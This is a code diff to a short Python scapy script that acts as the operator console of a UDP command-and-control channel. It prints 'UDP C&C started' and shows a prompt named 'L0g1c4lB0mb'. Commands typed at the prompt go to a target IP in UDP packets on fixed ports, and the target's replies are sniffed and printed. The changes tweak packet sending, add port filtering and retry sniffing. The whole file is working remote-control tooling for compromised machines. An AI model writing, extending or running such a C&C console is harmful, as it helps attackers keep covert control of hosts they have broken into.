@@ -1,4 +1,5 @@
-from scapy.all import sr,IP,UDP,Raw,sniff
+
+from scapy.all import sr1,IP,UDP,Raw,sniff
 from multiprocessing import Process
 import argparse
 TTL = int(60)
@@ -7,10 +8,13 @@ parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Des
 args = parser.parse_args()
 
 def sniffer():
-    sniff(prn=shell,filter="udp",store='0')
+    try:
+        sniff( prn=shell, filter="udp", store="0")
+    except IndexError:  
+        sniff( prn=shell, filter="udp", store="0")
 
 def shell(pkt):
-    if pkt[Raw].load and pkt[IP].src == args.destination_ip:
+    if pkt[Raw].load and pkt[IP].src == args.destination_ip and pkt[UDP].sport == 53555:
         udppaket = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n', '')
         print(udppaket)
     else:
@@ -21,7 +25,7 @@ def main():
     sniffing.start()
     print("UDP C&C started")
     while True:
-        res = input('L0g1c4lB0mb ➮ ')
+        res = input('L0g1c4lB0mb: ')
         if res == 'exit':
             sniffing.terminate()
             break
@@ -29,7 +33,7 @@ def main():
             pass
         else:
             payload = (IP(dst=args.destination_ip,ttl=TTL)/UDP(sport=53555, dport=60000)/Raw(load=res))
-            sr(payload,timeout=0,verbose=0)
+            sr1(payload,timeout=0,verbose=0)
     sniffing.join()
 
 if __name__ == "__main__":
